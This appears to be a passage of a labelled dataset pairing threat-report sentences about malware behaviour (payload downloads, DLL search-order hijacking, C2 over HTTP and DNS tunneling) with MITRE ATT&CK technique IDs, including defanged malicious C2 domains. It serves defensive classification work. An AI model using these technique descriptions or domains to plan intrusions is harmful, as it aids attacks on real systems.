,sentence,label_tec
481,"Anyconnect[.]stream Bigip[.]stream Fortiweb[.]download Kaspersky[.]science microtik[.]stream owa365[.]bid symanteclive[.]download windowsdefender[.]win  The listed C2 servers all resolved to IPs belonging to a service provider in China at 1.2.9.0/24, which is the IP address used by the C2 server to send a cancel communications message to the end system",T1105
482,The .iqy files take advantage of Excel’s willingness to download and include the contents from a remote server in a spreadsheet,T1105
483,2 Downloads a file to the system,T1105
484,"Once the victim downloads and executes the email attachment, it runs silently with no additional decoy documents or decoy dialog boxes",T1105
485,"This includes, but is not limited to, the following:  AES encryption of network communication File management Functionality to download, upload, and execute files Keylogging Remote desktop access Remote webcam viewing Reverse proxy Browser and FTP client password recovery  The images below are what a target user opening a malicious RTF document would see from within Microsoft Word",T1105
486,"13 Copy file to adbFle.tmp, and upload it to the C2",T1105
487,"When opened and then executed, the key components of the HTA file downloads and executes further malware from a remote URLand loads a decoy image hosted externally (Figure 3)",T1105
488,Both responses instruct the malware to download and load a remote plugin,T1105
489,"During a file analysis of PLAINTEE in WildFire, we observed the attackers download and execute a plugin during the runtime for that sample",T1105
490,Most of them manipulate the machine to download and execute different files,T1105
491,Use of PowerShell to download additional tools,T1105
492,The purpose is to download and execute an additional payload hosted on a compromised website: NavRAT,T1105
493,NavRAT is able to download and execute files located in the attachment of a received email,T1105
494,"The shellcode of the embedded object is designed to download an image, which is, in fact, a new shellcode used to decode an embedded executable",T1105
495,"Figure 2 SYSCON network traffic witnessed during execution   Pivoting on the domain hosting the SYSCON sample, 881.000webhostapp[.]com, revealed a number of additional samples, including a sample of the KONNI malware family, and four 64-bit executable files belonging to the CARROTBAT malware family",T1105
496,"CARROTBAT itself is a dropper that allows an attacker to drop and open an embedded decoy file, followed by the execution of a command that will download and run a payload on the targeted machine",T1105
497,Delivery document The delivery document contains a macro that downloads an executable from a remote server,T1105
498,Command_Down_exec: This command downloads and executes new modules.  It takes a url as the argument and uses that to download and execute files,T1105
499,"Its presence on a compromised system allows a threat actor to spawn a reverse shell, upload or download files, and capture keystrokes",T1105
500,"After reestablishing access, the adversaries download tools such as gsecudmp and WCE that are staged temporarily on websites that TG-3390 previously compromised but never used",T1105
501,"The OwaAuth web shell enables a threat actor to upload and download files, launch processes, and execute SQL queries",T1105
502,"The script self-scheduling, as well as the scheduling of a script that repeatedly attempts to download and execute the Revenge RAT binary, significantly contribute to the persistence of this infection",T1105
503,"A backdoor that communicates with a single command and control (C2) server using HTTP GET and POST requests, TONEDEAF supports collecting system information, uploading and downloading of files, and arbitrary shell command execution.",T1105
504,"We found a mechanism for decrypting, executing, and downloading an additional payload from the C&C server.",T1105
505,"certutil is a WIndows component that can download external content to the computer. In a typical attack, the criminals follow this paradigm",T1105
506,The SQLRat script is designed to make a direct SQL connection to a Microsoft database controlled by the attackers and execute the contents of various tables,T1105
507,"The backdoor has the capability to download and upload files, execute shell commands, and update its configuration.",T1105
508,BUGJUICE is a backdoor that is executed by launching a benign file and then hijacking the search order to load a malicious dll into it,T1574
509,This most likely means there is some type of DLL hijacking going on by distributing a legitimate McAfee binary with MirageFox to load up the DLL properly into a legitimate looking process,T1574
510,Whitefly has consistently used a technique known as search order hijacking to run Vcrodat.,T1574
511,Attackers can therefore give a malicious DLL the same name as a legitimate DLL but place it ahead of the legitimate version in the search order so that it will be loaded when Windows searches for it.,T1574
512,"Nibatad is also a loader that leverages search order hijacking, and downloads an encrypted payload to the infected computer.",T1574
513,"BUGJUICE defaults to TCP using a custom binary protocol to communicate with the C2, but can also use HTTP and HTTPs if directed by the C2",T1071
514,SNUGRIDE is a backdoor that communicates with its C2 server through HTTP requests,T1071
515,"We mentioned earlier that due to the nature of the IE injection technique used by the HTTP-based backdoors, a number of C2 commands were cached to disk",T1071
516,"And, according to the collected config files, the group upgraded their malware communications from plain text http to encrypted https in October 2013",T1071
517,Figure 1: Configuration file that adds new C2 server and forces the data-stealing backdoor to use it   Figure 2: Configuration file that adds TCP tunnels and records desktop video Command and Control CARBANAK communicates to its C2 servers via pseudo-HTTP or a custom binary protocol,T1071
518,Pseudo-HTTP Protocol Messages for the pseudo-HTTP protocol are delimited with the ‘|’ character,T1071
519,"We recently mentioned this tool in another report on April 16, as this variant of the BONDUPDATER tool used DNS tunneling to communicate with its C2, specifically using TXT queries to receive information from the C2 server",T1071
520,"Server Command and control server that communicates via DNS tunneling   Panel Graphical User Interface that allows actors to issue commands, upload and download files to Agents via the Server    Table 2",T1071
